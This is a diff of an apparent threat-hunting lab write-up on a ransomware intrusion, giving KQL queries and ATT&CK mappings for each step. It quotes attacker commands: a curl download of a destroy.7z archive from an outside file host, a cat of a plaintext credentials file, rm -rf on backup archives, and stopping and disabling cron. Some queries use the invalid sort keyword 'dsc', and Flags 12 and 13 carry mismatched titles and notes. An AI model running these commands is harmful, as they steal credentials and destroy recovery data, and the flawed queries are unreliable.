@@ -173,7 +173,7 @@ DeviceProcessEvents
 
 **Objective**: Identify tools downloaded from external infrastructure.
 
-Under MITRE ATT&CK T1105 (Ingress Tool Transfer), an external tool was downloaded using the command **curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z**. This activity indicates the transfer of a potentially malicious archive from external infrastructure to the compromised host for use in subsequent attack stages.
+Under MITRE ATT&CK T1105 (Ingress Tool Transfer), an external tool was downloaded using the command *curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z*. This activity indicates the transfer of a potentially malicious archive from external infrastructure to the compromised host for use in subsequent attack stages.
 
 <img width="808" height="140" alt="image" src="https://github.com/user-attachments/assets/20839ffd-69d9-4024-9a04-93bd48bd5974" />
 
@@ -185,9 +185,129 @@ DeviceProcessEvents
 | where Timestamp >= datetime(2025-11-01)
 | where Timestamp < datetime(2025-12-01)
 | project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
-| order by Timestamp asc
+| order by Timestamp dsc
 ```
 
 **Notes:** Downloading tools externally confirms preparation for destructive actions rather than opportunistic behavior.
+
+---
+
+##  🚩 Flag 9: Credential Theft
+
+**Objective**: Identify access to stored credentials.
+
+Under MITRE ATT&CK T1552.001 (Unsecured Credentials in Files), stored credentials were accessed using the command **cat /backups/configs/all-credentials.txt**. This activity indicates that sensitive authentication information was exposed in plaintext files, enabling the attacker to harvest credentials for further compromise.
+
+<img width="1011" height="168" alt="image" src="https://github.com/user-attachments/assets/1c363685-d34e-481f-97d1-45b085de5969" />
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where AccountName == "backup-admin"
+| where FileName == "cat"
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, ProcessCommandLine, AccountName
+| order by Timestamp dsc
+```
+
+**Notes:** Accessing stored credentials enabled further lateral movement and escalation.
+
+---
+
+##  🚩 Flag 10: Backup Destruction
+
+**Objective**: Identify the command that destroyed backup data.
+
+Under MITRE ATT&CK T1485 (Data Destruction), backup data was destroyed through the execution of the command **rm -rf /backups/archives**. This action resulted in the recursive and irreversible deletion of archived backup files, indicating a deliberate attempt to disrupt recovery capabilities and cause operational impact.
+
+<img width="783" height="62" alt="image" src="https://github.com/user-attachments/assets/d433686d-535c-4c6f-a27a-560fc99fb2b3" />
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where DeviceName contains "BackupSrv"
+| where ProcessCommandLine startswith "rm -rf /backups/"
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, ProcessCommandLine, AccountName
+| order by Timestamp dsc
+```
+
+**Notes:**  Deleting backup directories ensured recovery was no longer possible.
+
+---
+
+##  🚩 Flag 11: Backup Service Stopped
+
+**Objective**: Identify services stopped to disrupt backups.
+
+Under MITRE ATT&CK T1489 (Service Stop), backup operations were disrupted by executing the command **systemctl stop cron**. This action halted the cron scheduling service, preventing scheduled backup tasks from running and further degrading system recovery capabilities.
+
+<img width="788" height="150" alt="image" src="https://github.com/user-attachments/assets/dec6e98a-417e-43b6-8265-25561dfb95ec" />
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where DeviceName contains "BackupSrv"
+| where ProcessCommandLine contains "stop"
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, ProcessCommandLine, AccountName
+| order by Timestamp dsc
+```
+
+**Notes:**  Stopping cron immediately halted scheduled backup jobs.
+
+---
+
+##  🚩 Flag 12: External Tool Download
+
+**Objective**: Identify services stopped to disrupt backups.
+
+Under MITRE ATT&CK T1489 (Service Stop), services were permanently disabled by executing the command systemctl disable cron. This action prevented the cron service from starting on system reboot, ensuring that scheduled tasks including backup operations remained inactive and reinforcing sustained disruption.
+
+<img width="792" height="140" alt="image" src="https://github.com/user-attachments/assets/bdad728d-f56d-4c35-bffc-24fd9d977c36" />
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where DeviceName contains "BackupSrv"
+| where ProcessCommandLine contains "disable"
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, ProcessCommandLine, AccountName
+| order by Timestamp dsc
+```
+
+**Notes:**  Disabling the service ensured backups would not resume after reboot.
+
+---
+
+## 💻 PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)
+
+---
+
+##  🚩 Flag 13: Remote Execution Tool
+
+**Objective**: Identify the tool used to deploy ransomware.
+
+Under MITRE ATT&CK T1021.002 (Remote Services: SMB / Windows Admin Shares), analysis identified PsExec64.exe as the tool used to deploy ransomware. This utility enabled remote command execution over SMB administrative shares, facilitating lateral movement and coordinated ransomware deployment across Windows systems.
+
+
+<img width="791" height="101" alt="image" src="https://github.com/user-attachments/assets/288726d9-7cd4-4263-a38e-d000ce34729c" />
+
+
+**KQL Query**:
+```kql
+DeviceProcessEvents
+| where FileName startswith "PsExec"
+| where Timestamp >= datetime(2025-11-01)
+| where Timestamp < datetime(2025-12-01)
+| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName
+| order by Timestamp asc
+```
+
+**Notes:**  Disabling the service ensured backups would not resume after reboot.
 
 ---
